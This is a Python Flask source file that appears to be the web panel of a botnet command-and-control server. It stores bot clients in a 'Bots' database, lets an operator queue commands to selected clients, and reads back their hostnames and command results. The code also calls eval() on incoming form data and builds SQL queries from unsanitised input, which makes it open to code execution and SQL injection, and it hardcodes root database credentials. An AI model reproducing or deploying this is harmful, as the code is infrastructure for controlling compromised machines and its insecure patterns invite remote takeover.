#!/usr/bin/env python3
from flask import Flask, render_template, request
from random import getrandbits, randint
from hashlib import md5
import pymysql
import sys

#TODO: Tidy and Clean code up
#TODO: sterilize inputs to prevent XSS and SQLI
#TODO: Add error handling

app = Flask(__name__)

try:
    db = pymysql.connect("127.0.0.1", "root", "pass", "Bots")
except pymysql.err.OperationalError as err:
    print("\033[1;31m[-]\033[1;37m Unable to connect to database, the following error occured: \n    {}".format(err))
    sys.exit(-1)

@app.route("/getCommandInfo", methods=["GET"])
def get_command_info():
    try:
        cursor = db.cursor()
        r = cursor.execute("select concat(ClientCommand.ClientID, ' - ', Client.HostName), Command.CommandID, Command.Command, ClientCommand.Sent, ClientCommand.Result from ClientCommand inner join Command on ClientCommand.CommandID = Command.CommandID inner join Client on ClientCommand.ClientID = Client.ClientID;")
        results = [list(cursor.fetchone()) for x in range(r)]
        cursor.close()
    except Exception:
        pass
    return str(results)

@app.route("/uploadCommand", methods=["POST"])
def upload_command():
    if check_server() == "0": return "-1"

    cursor = db.cursor()

    data = request.form
    info = ""
    for i in data: info = eval(i)
    print("Clients: {}\nCommand: {}".format(str(info["clients"]), info["cmd"]))

    q = cursor.execute("select ClientID from Client")
    live_clients = cursor.fetchall()

    for i in info["clients"]:
        if i not in live_clients:
            return "[-1, 'Invalid ClientID']"

    cmdID = md5(str(getrandbits(randint(0, 999999))).encode("utf-8")).hexdigest()

    cursor.execute("insert into Command (CommandID, Command) values('{}', '{}')".format(cmdID, info["cmd"]))
    db.commit()
    for clientID in info["clients"]:
        cursor.execute("SET FOREIGN_KEY_CHECKS = 0;insert into ClientCommand (ClientID, CommandID) values('{}', '{}');SET FOREIGN_KEY_CHECKS = 1;".format(clientID, cmdID))
        db.commit()
    cursor.close()
    return "[0, '']"

@app.route("/activeServers", methods=["GET"])
def check_server():
    cursor = db.cursor()
    s = cursor.execute("select * from Server where isActive = 1")
    s_data = [list(cursor.fetchone()) for x in range(s)]
    c = cursor.execute("select * from Client")
    c_data = [list(cursor.fetchone()) for x in range(c)]
    cursor.close()
    return str([s_data, c_data]) if s_data else "0"

def database_error(err):
    print("\033[1;31m[-]\033[1;37m DATSBASE ERROR: \n    {}".format(err))

@app.route("/")
def main():
    return render_template("index.html")

if __name__ == '__main__':
    app.run()
